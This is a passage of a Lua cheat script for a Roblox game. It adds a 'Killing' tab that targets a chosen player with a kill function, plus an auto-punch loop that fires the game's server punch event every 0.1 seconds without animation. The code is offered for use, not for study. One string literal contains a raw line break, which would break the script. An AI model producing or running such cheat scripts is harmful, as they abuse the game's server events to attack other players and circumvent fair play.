        local targetName = SelectTargetDropdown:GetValue()
        if targetName then
            killPlayers(targetName) -- Targets selected player only
        end
    else
        getgenv().killNearby = false
    end
end)

-- Update dropdown when players join/leave
game.Players.PlayerAdded:Connect(updateTargetDropdown)
game.Players.PlayerRemoving:Connect(updateTargetDropdown)

Tabs.Killing:AddParagraph({
    Title = "Auto Punch",
    Content = "Activate The Auto Punch when you
use a toggle that kills a player"
})

local AutoPunchNoAnimToggle = false

-- Add Auto Punch [No Animation] toggle
Tabs.Killing:AddToggle("Auto Punch [No Animation]", {
    Title = "Auto Punch [No Animation]",
    Description = "Automatically punches every 0.1 seconds without animation.",
    Default = false,
    Callback = function(state)
        AutoPunchNoAnimToggle = state
        local player = game.Players.LocalPlayer
        local playerName = player.Name
        local punchTool =
            player.Backpack:FindFirstChild("Punch") or
            game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")
        _G.autoPunchanim = true -- Global control variable

        while AutoPunchNoAnimToggle do
            if punchTool then
                if punchTool.Parent ~= game.Workspace:FindFirstChild(playerName) then
                    punchTool.Parent = game.Workspace:FindFirstChild(playerName) -- Equip the tool
                end
                -- Perform the punching action
                game.Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
                game.Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
                wait(0.1) -- Punch every 0.1 seconds
            else
                warn("Punch tool not found")
                _G.autoPunchanim = false -- Stop the loop if tool is not found
                break
            end
        end
    end
})
